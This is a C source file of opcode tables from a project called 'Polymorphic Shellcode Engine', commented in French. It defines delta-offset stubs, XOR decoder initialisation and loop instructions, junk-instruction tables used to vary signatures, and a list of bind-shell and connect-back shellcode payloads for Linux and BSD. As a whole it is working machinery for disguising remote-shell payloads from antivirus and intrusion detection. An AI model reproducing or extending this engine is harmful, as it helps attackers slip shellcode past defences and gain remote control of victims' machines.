/*
** gl_tab.c for Polymorphic Shellcode Engine project
** 
** Made by eee
** 
** Started on  Tue Apr 12 15:59:11 2005 eee
** Last update Mon Apr 18 14:10:17 2005 eee
*/

#include <pse.h>

/* Tableau pour le delta offset */
t_tab	gl_delta[]=
  {
    {0, 0x005D06EB, "JMP SHORT XX\nPOP EBP"},
    {1, 0x000007EB, "JMP SHORT XX"},
    {2, 0xFFFFF5E8, "CALL XXXXXXXX"},
    {3, 0x000000FF, ""}
  };

/* Tableau des 4 instructions d'initialisation */
/* NOTE : ADD EBP, xx doit rester la derniere dans le tableau et ne pas */
/* etre comptee dans TAB_INIT */
t_tab	gl_init[]=
  {
    {0, 0x0000EE89, "MOV ESI, EBP"},
    {1, 0x0000EF89, "MOV EDI, EBP"},
    {2, 0x00B1C931, "XOR ECX, ECX\nMOV CL, 'size'"},
    {3, 0x00000031, "XOR reg, reg\nMOV reg8, 'key'"},
    {4, 0x0000c583, "ADD EBP, xx"}
  };

t_tab	gl_loop[]=
  {
    {0, CLD,		"CLD"},
    {1, LODSB,		"LODSB"},
    {2, MOV_AL_ESI,	"MOV AL, [ESI]"},
    {3, INC_ESI,       	"INC ESI"},
    {4, XOR_AL_BL,	"XOR AL, BL"},
    {5, XOR_AL_DL,	"XOR AL, DL"},
    {6, INC_BL,		"INC BL"},
    {7, INC_DL,		"INC DL"},
    {8, MOV_EDI_AL,	"MOV [EDI], AL"},
    {9, INC_EDI,       	"INC EDI"},
    {10, STOSB,		"STOSB"},
    {11, LOOP,		"LOOP"}
  };

/* Premier tableau (pour le init) de junk sur 1 bytes */
t_tab	gl_junk1[]=
  {
    {0, 0x90, "NOP"},
    {1, 0x40, "INC EAX"},
    {2, 0x48, "DEC EAX"},
    {3, 0xF8, "CLC"},
    {4, 0xFD, "CLD"},
    {5, 0xF5, "CMC"}
  };

/* Tableau 'universel' de junk sur 2 bytes */
t_tab	gl_junk2[]=
  {
    {0,  0x5850, "PUSH EAX\nPOP EAX"},
    {1,  0x5B53, "PUSH EBX\nPOP EBX"},
    {2,  0x5951, "PUSH ECX\nPOP ECX"},
    {3,  0x5A52, "PUSH EDX\nPOP EDX"},
    {4,  0x4048, "DEC EAX\nINC EAX"},
    {5,  0x434B, "DEC EBX\nINC EBX"},
    {6,  0x4149, "DEC ECX\nINC ECX"},
    {7,  0x424A, "DEC EDX\nINC EDX"},
    {8,  0xDB87, "XCHG EBX, EBX"},
    {9,  0xC987, "XCHG ECX, ECX"},
    {10, 0xD287, "XCHG EDX, EDX"},
    {11, 0xC089, "MOV EAX, EAX"},
    {12, 0xDB89, "MOV EBX, EBX"},
    {13, 0xC989, "MOV ECX, ECX"},
    {14, 0xD289, "MOV EDX, EDX"}
  };

t_sh	gl_sh[]=
  {
    {0, 0x17, -1, "./shellcode/linux/bind.bin", "linux : Bind shell."},
    {1, 0x18, 0x12, "./shellcode/linux/connect.bin", "linux : Connect back."},
    {2, 1, -1, "./shellcode/bsd/bind.bin", "pas dispo"},
    {3, 1, 1, "./shellcode/bsd/connect.bin", "pas dispo"},
    {4, 0, 0, 0, 0}
  };
